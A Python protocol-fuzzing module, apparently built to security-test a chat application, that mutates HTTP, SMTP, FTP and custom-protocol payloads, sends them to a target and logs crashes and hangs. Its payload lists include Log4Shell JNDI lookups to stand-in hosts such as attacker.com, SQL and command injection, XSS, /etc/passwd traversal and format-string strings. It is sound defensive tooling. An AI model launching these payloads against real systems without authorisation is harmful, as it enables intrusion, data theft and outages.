# Protocol Fuzzer
"""Network protocol fuzzing for vulnerability discovery."""

import socket
import asyncio
import random
import struct
import time
import logging
import threading
from typing import Dict, List, Any, Optional, Tuple, Callable
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
import json


class FuzzingStrategy(Enum):
    """Fuzzing strategies for protocol testing."""
    BIT_FLIP = "bit_flip"
    BYTE_FLIP = "byte_flip"
    ARITHMETIC = "arithmetic"
    INSERT = "insert"
    DELETE = "delete"
    REPLACE = "replace"
    FORMAT_STRING = "format_string"
    BUFFER_OVERFLOW = "buffer_overflow"
    INJECTION = "injection"


@dataclass
class FuzzCase:
    """Represents a single fuzz test case."""
    
    name: str
    description: str
    payload: bytes
    expected_behavior: str
    category: str  # malformed, overflow, injection, etc.
    
@dataclass
class FuzzResult:
    """Result of a fuzz test."""
    
    test_case: FuzzCase
    target: str
    port: int
    response: Optional[bytes]
    error: Optional[str]
    crashed: bool
    hang: bool
    unexpected_behavior: bool
    execution_time: float
    timestamp: datetime

class ProtocolFuzzer:
    """Fuzzes network protocols to find vulnerabilities."""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.fuzz_results = []
        self.mutation_strategies = [
            self._bit_flip_mutation,
            self._byte_flip_mutation,
            self._arithmetic_mutation,
            self._insert_mutation,
            self._delete_mutation,
            self._replace_mutation,
            self._format_string_mutation,
            self._buffer_overflow_mutation,
            self._injection_mutation
        ]
        
        # Protocol templates
        self.protocol_templates = {
            'http': self._generate_http_templates(),
            'smtp': self._generate_smtp_templates(),
            'ftp': self._generate_ftp_templates(),
            'custom': self._generate_custom_templates()
        }
        
        # Interesting values for fuzzing
        self.interesting_values = {
            'integers': [0, 1, -1, 127, 128, 255, 256, 32767, 32768, 65535, 65536,
                        2147483647, 2147483648, 4294967295, 4294967296],
            'strings': ['', 'A', 'AA', 'A' * 100, 'A' * 1000, 'A' * 10000,
                       '%s', '%n', '%x', '../', '..\\', '<script>', '${jndi:ldap://}',
                       '\x00', '\r\n', '\n\r', '\\x00', '\'', '"', '`', ';', '|', '&'],
            'formats': ['%s' * 10, '%n' * 10, '%x' * 10, '%d' * 10],
            'payloads': [
                b'\x00' * 100,
                b'\xff' * 100,
                b'\x41' * 1000,  # 'A' * 1000
                b'\x00\x00\x00\x00',  # Null bytes
                b'\xff\xff\xff\xff',  # Max values
                b'\x0d\x0a' * 50,  # CRLF injection
                b'%n' * 100,  # Format string
            ]
        }
        
    def _generate_http_templates(self) -> List[FuzzCase]:
        """Generate HTTP protocol fuzz templates."""
        templates = []
        
        # Basic HTTP request fuzzing
        templates.append(FuzzCase(
            name="http_method_overflow",
            description="HTTP method buffer overflow",
            payload=b"A" * 10000 + b" / HTTP/1.1\r\nHost: target\r\n\r\n",
            expected_behavior="400 Bad Request or connection close",
            category="overflow"
        ))
        
        templates.append(FuzzCase(
            name="http_header_injection",
            description="HTTP header injection",
            payload=b"GET / HTTP/1.1\r\nHost: target\r\nX-Injected: test\r\n\r\nGET /admin",
            expected_behavior="Single response only",
            category="injection"
        ))
        
        templates.append(FuzzCase(
            name="http_path_traversal",
            description="Path traversal attempt",
            payload=b"GET /../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
            expected_behavior="404 or 400 error",
            category="traversal"
        ))
        
        templates.append(FuzzCase(
            name="http_format_string",
            description="Format string in headers",
            payload=b"GET / HTTP/1.1\r\nHost: %n%n%n%n%n\r\n\r\n",
            expected_behavior="Normal response",
            category="format"
        ))
        
        return templates
        
    def _generate_smtp_templates(self) -> List[FuzzCase]:
        """Generate SMTP protocol fuzz templates."""
        templates = []
        
        templates.append(FuzzCase(
            name="smtp_command_overflow",
            description="SMTP command buffer overflow",
            payload=b"HELO " + b"A" * 10000 + b"\r\n",
            expected_behavior="Error response",
            category="overflow"
        ))
        
        templates.append(FuzzCase(
            name="smtp_crlf_injection",
            description="SMTP CRLF injection",
            payload=b"MAIL FROM: <test@test.com>\r\nRCPT TO: <admin@target>\r\n",
            expected_behavior="Single command processing",
            category="injection"
        ))
        
        return templates
        
    def _generate_ftp_templates(self) -> List[FuzzCase]:
        """Generate FTP protocol fuzz templates."""
        templates = []
        
        templates.append(FuzzCase(
            name="ftp_user_overflow",
            description="FTP USER command overflow",
            payload=b"USER " + b"A" * 10000 + b"\r\n",
            expected_behavior="Error response",
            category="overflow"
        ))
        
        templates.append(FuzzCase(
            name="ftp_path_traversal",
            description="FTP path traversal",
            payload=b"RETR ../../../etc/passwd\r\n",
            expected_behavior="Access denied",
            category="traversal"
        ))
        
        return templates
        
    def _generate_custom_templates(self) -> List[FuzzCase]:
        """Generate custom protocol fuzz templates."""
        templates = []
        
        # Add custom protocol templates for Privatus-chat
        templates.append(FuzzCase(
            name="custom_message_overflow",
            description="Custom protocol message overflow",
            payload=struct.pack('>I', 0xFFFFFFFF) + b"A" * 10000,
            expected_behavior="Connection close or error",
            category="overflow"
        ))
        
        templates.append(FuzzCase(
            name="custom_invalid_type",
            description="Invalid message type",
            payload=struct.pack('>BB', 0xFF, 0xFF) + b"test",
            expected_behavior="Error response",
            category="malformed"
        ))
        
        return templates
        
    async def fuzz_target(self, target: str, port: int, protocol: str = 'custom',
                         iterations: int = 1000, timeout: int = 5) -> List[FuzzResult]:
        """Fuzz a target service."""
        self.logger.info(f"Starting fuzzing of {target}:{port} ({protocol})")
        results = []
        
        # Get base templates for protocol
        templates = self.protocol_templates.get(protocol, [])
        
        # Generate fuzz cases
        fuzz_cases = self._generate_fuzz_cases(templates, iterations)
        
        # Execute fuzz tests
        for i, case in enumerate(fuzz_cases):
            if i % 100 == 0:
                self.logger.info(f"Fuzzing progress: {i}/{len(fuzz_cases)}")
                
            result = await self._execute_fuzz_case(target, port, case, timeout)
            results.append(result)
            
            # Check for crashes or hangs
            if result.crashed or result.hang:
                self.logger.warning(f"Potential vulnerability found: {case.name}")
                self._save_crash_case(result)
                
        # Analyze results
        analysis = self._analyze_results(results)
        self.logger.info(f"Fuzzing complete. Found {analysis['crashes']} crashes, "
                        f"{analysis['hangs']} hangs, {analysis['errors']} errors")
        
        return results
        
    def _generate_fuzz_cases(self, templates: List[FuzzCase], iterations: int) -> List[FuzzCase]:
        """Generate fuzz test cases from templates."""
        cases = []
        
        # Add original templates
        cases.extend(templates)
        
        # Generate mutations
        for _ in range(iterations):
            # Pick random template
            if templates:
                template = random.choice(templates)
                
                # Apply random mutation
                mutation_func = random.choice(self.mutation_strategies)
                mutated_payload = mutation_func(template.payload)
                
                case = FuzzCase(
                    name=f"{template.name}_mutated_{len(cases)}",
                    description=f"Mutation of {template.description}",
                    payload=mutated_payload,
                    expected_behavior=template.expected_behavior,
                    category=template.category
                )
                cases.append(case)
            else:
                # Generate random payload
                case = self._generate_random_case(len(cases))
                cases.append(case)
                
        return cases
        
    def _generate_random_case(self, index: int) -> FuzzCase:
        """Generate random fuzz case."""
        strategies = [
            self._generate_overflow_case,
            self._generate_format_string_case,
            self._generate_injection_case,
            self._generate_malformed_case
        ]
        
        strategy = random.choice(strategies)
        return strategy(index)
        
    def _generate_overflow_case(self, index: int) -> FuzzCase:
        """Generate buffer overflow test case."""
        size = random.choice([100, 1000, 10000, 100000])
        pattern = random.choice([b'A', b'\x00', b'\xff', b'\x41\x42\x43\x44'])
        
        return FuzzCase(
            name=f"overflow_{index}",
            description=f"Buffer overflow with {size} bytes",
            payload=pattern * size,
            expected_behavior="Connection close or error",
            category="overflow"
        )
        
    def _generate_format_string_case(self, index: int) -> FuzzCase:
        """Generate format string test case."""
        format_strings = self.interesting_values['formats']
        fmt = random.choice(format_strings)
        
        return FuzzCase(
            name=f"format_string_{index}",
            description="Format string attack",
            payload=fmt.encode(),
            expected_behavior="Normal processing",
            category="format"
        )
        
    def _generate_injection_case(self, index: int) -> FuzzCase:
        """Generate injection test case."""
        injections = [
            b"'; DROP TABLE users; --",
            b"<script>alert('xss')</script>",
            b"${jndi:ldap://attacker.com/evil}",
            b"../../../etc/passwd",
            b"| whoami",
            b"; cat /etc/passwd"
        ]
        
        injection = random.choice(injections)
        
        return FuzzCase(
            name=f"injection_{index}",
            description="Injection attack attempt",
            payload=injection,
            expected_behavior="Sanitized or rejected",
            category="injection"
        )
        
    def _generate_malformed_case(self, index: int) -> FuzzCase:
        """Generate malformed data test case."""
        # Random bytes
        size = random.randint(1, 1000)
        payload = bytes([random.randint(0, 255) for _ in range(size)])
        
        return FuzzCase(
            name=f"malformed_{index}",
            description="Malformed data",
            payload=payload,
            expected_behavior="Error handling",
            category="malformed"
        )
        
    # Mutation strategies
    def _bit_flip_mutation(self, data: bytes) -> bytes:
        """Flip random bits in data."""
        if not data:
            return data
            
        data_array = bytearray(data)
        num_flips = random.randint(1, min(8, len(data)))
        
        for _ in range(num_flips):
            byte_idx = random.randint(0, len(data_array) - 1)
            bit_idx = random.randint(0, 7)
            data_array[byte_idx] ^= (1 << bit_idx)
            
        return bytes(data_array)
        
    def _byte_flip_mutation(self, data: bytes) -> bytes:
        """Flip random bytes in data."""
        if not data:
            return data
            
        data_array = bytearray(data)
        num_flips = random.randint(1, min(10, len(data)))
        
        for _ in range(num_flips):
            idx = random.randint(0, len(data_array) - 1)
            data_array[idx] = 255 - data_array[idx]
            
        return bytes(data_array)
        
    def _arithmetic_mutation(self, data: bytes) -> bytes:
        """Apply arithmetic operations to bytes."""
        if not data:
            return data
            
        data_array = bytearray(data)
        num_ops = random.randint(1, min(10, len(data)))
        
        for _ in range(num_ops):
            idx = random.randint(0, len(data_array) - 1)
            op = random.choice([1, -1, 127, -128])
            data_array[idx] = (data_array[idx] + op) % 256
            
        return bytes(data_array)
        
    def _insert_mutation(self, data: bytes) -> bytes:
        """Insert random bytes into data."""
        if len(data) > 10000:  # Limit size
            return data
            
        insert_data = random.choice(self.interesting_values['payloads'])
        insert_pos = random.randint(0, len(data))
        
        return data[:insert_pos] + insert_data + data[insert_pos:]
        
    def _delete_mutation(self, data: bytes) -> bytes:
        """Delete random bytes from data."""
        if len(data) < 2:
            return data
            
        delete_size = random.randint(1, min(100, len(data) // 2))
        delete_pos = random.randint(0, len(data) - delete_size)
        
        return data[:delete_pos] + data[delete_pos + delete_size:]
        
    def _replace_mutation(self, data: bytes) -> bytes:
        """Replace bytes with interesting values."""
        if not data:
            return data
            
        data_array = bytearray(data)
        interesting_bytes = [0x00, 0xFF, 0x7F, 0x80, 0x01, 0x41, 0x0A, 0x0D]
        
        num_replacements = random.randint(1, min(20, len(data)))
        for _ in range(num_replacements):
            idx = random.randint(0, len(data_array) - 1)
            data_array[idx] = random.choice(interesting_bytes)
            
        return bytes(data_array)
        
    def _format_string_mutation(self, data: bytes) -> bytes:
        """Insert format string specifiers."""
        format_specs = [b'%s', b'%n', b'%x', b'%d', b'%p']
        insert_pos = random.randint(0, len(data))
        spec = random.choice(format_specs) * random.randint(1, 10)
        
        return data[:insert_pos] + spec + data[insert_pos:]
        
    def _buffer_overflow_mutation(self, data: bytes) -> bytes:
        """Create buffer overflow payloads."""
        overflow_sizes = [100, 1000, 10000, 65536]
        size = random.choice(overflow_sizes)
        pattern = b'A' * size
        
        if random.random() < 0.5:
            # Append overflow
            return data + pattern
        else:
            # Replace with overflow
            return pattern
            
    def _injection_mutation(self, data: bytes) -> bytes:
        """Add injection payloads."""
        injections = [
            b"'; DROP TABLE test; --",
            b'" OR 1=1 --',
            b'${jndi:ldap://evil.com}',
            b'<img src=x onerror=alert(1)>',
            b'../../../../../../etc/passwd',
            b'%0d%0aSet-Cookie: admin=true'
        ]
        
        injection = random.choice(injections)
        insert_pos = random.randint(0, len(data))
        
        return data[:insert_pos] + injection + data[insert_pos:]
        
    async def _execute_fuzz_case(self, target: str, port: int, case: FuzzCase,
                                timeout: int) -> FuzzResult:
        """Execute a single fuzz test case."""
        start_time = time.time()
        response = None
        error = None
        crashed = False
        hang = False
        unexpected = False
        
        try:
            # Create connection
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=timeout
            )
            
            # Send payload
            writer.write(case.payload)
            await writer.drain()
            
            # Try to read response
            try:
                response = await asyncio.wait_for(
                    reader.read(4096),
                    timeout=timeout
                )
            except asyncio.TimeoutError:
                hang = True
                
            # Close connection
            writer.close()
            await writer.wait_closed()
            
            # Check if service is still alive
            if not await self._check_service_alive(target, port):
                crashed = True
                
        except asyncio.TimeoutError:
            error = "Connection timeout"
            hang = True
        except ConnectionRefusedError:
            error = "Connection refused"
            crashed = True
        except Exception as e:
            error = str(e)
            unexpected = True
            
        execution_time = time.time() - start_time
        
        return FuzzResult(
            test_case=case,
            target=target,
            port=port,
            response=response,
            error=error,
            crashed=crashed,
            hang=hang,
            unexpected_behavior=unexpected,
            execution_time=execution_time,
            timestamp=datetime.now()
        )
        
    async def _check_service_alive(self, target: str, port: int) -> bool:
        """Check if service is still responding."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=2
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
            
    def _analyze_results(self, results: List[FuzzResult]) -> Dict[str, Any]:
        """Analyze fuzzing results."""
        analysis = {
            'total_tests': len(results),
            'crashes': 0,
            'hangs': 0,
            'errors': 0,
            'unexpected': 0,
            'by_category': {},
            'interesting_cases': []
        }
        
        for result in results:
            if result.crashed:
                analysis['crashes'] += 1
                analysis['interesting_cases'].append(result)
            if result.hang:
                analysis['hangs'] += 1
                analysis['interesting_cases'].append(result)
            if result.error:
                analysis['errors'] += 1
            if result.unexpected_behavior:
                analysis['unexpected'] += 1
                analysis['interesting_cases'].append(result)
                
            # By category
            category = result.test_case.category
            if category not in analysis['by_category']:
                analysis['by_category'][category] = {
                    'total': 0, 'crashes': 0, 'hangs': 0, 'errors': 0
                }
            analysis['by_category'][category]['total'] += 1
            if result.crashed:
                analysis['by_category'][category]['crashes'] += 1
            if result.hang:
                analysis['by_category'][category]['hangs'] += 1
            if result.error:
                analysis['by_category'][category]['errors'] += 1
                
        return analysis
        
    def _save_crash_case(self, result: FuzzResult):
        """Save crash-inducing test case for reproduction."""
        crash_data = {
            'test_case': {
                'name': result.test_case.name,
                'description': result.test_case.description,
                'payload': result.test_case.payload.hex(),
                'category': result.test_case.category
            },
            'result': {
                'target': result.target,
                'port': result.port,
                'error': result.error,
                'crashed': result.crashed,
                'hang': result.hang,
                'execution_time': result.execution_time,
                'timestamp': result.timestamp.isoformat()
            }
        }
        
        # Save to file
        filename = f"crash_{result.test_case.name}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(crash_data, f, indent=2)
            
        self.logger.info(f"Saved crash case to {filename}")
        
    def generate_report(self, results: List[FuzzResult]) -> str:
        """Generate fuzzing report."""
        analysis = self._analyze_results(results)
        
        report = f"""
Fuzzing Report
==============

Summary:
--------
Total Tests: {analysis['total_tests']}
Crashes: {analysis['crashes']}
Hangs: {analysis['hangs']}
Errors: {analysis['errors']}
Unexpected Behaviors: {analysis['unexpected']}

By Category:
-----------
"""
        
        for category, stats in analysis['by_category'].items():
            report += f"\n{category}:\n"
            report += f"  Total: {stats['total']}\n"
            report += f"  Crashes: {stats['crashes']}\n"
            report += f"  Hangs: {stats['hangs']}\n"
            report += f"  Errors: {stats['errors']}\n"
            
        if analysis['interesting_cases']:
            report += "\nInteresting Cases:\n"
            report += "-----------------\n"
            
            for case in analysis['interesting_cases'][:10]:  # Top 10
                report += f"\nTest: {case.test_case.name}\n"
                report += f"Description: {case.test_case.description}\n"
                report += f"Category: {case.test_case.category}\n"
                report += f"Result: "
                if case.crashed:
                    report += "CRASH "
                if case.hang:
                    report += "HANG "
                if case.unexpected_behavior:
                    report += "UNEXPECTED "
                report += "\n"
                if case.error:
                    report += f"Error: {case.error}\n"
                    
        return report 